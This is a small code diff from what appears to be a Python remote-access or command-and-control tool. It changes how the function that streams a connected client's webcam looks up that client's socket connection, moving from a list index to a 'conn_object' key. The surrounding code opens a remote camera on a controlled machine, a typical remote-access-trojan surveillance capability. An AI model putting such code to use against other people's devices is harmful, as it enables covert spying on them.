@@ -7,7 +7,7 @@ import cv2
 
 
 def main(self, sock, command):
-    send_all.main(self.config.scout_database[self.config.bridged_to][0], command)
+    send_all.main(self.config.scout_database[self.config.bridged_to]["conn_object"], command)
     self.log.inf('Streaming clients webcam, press "q" in the live stream window to exit')
     message = recv_all.main(sock)
     if message != '[+]Successfully opened camera!':
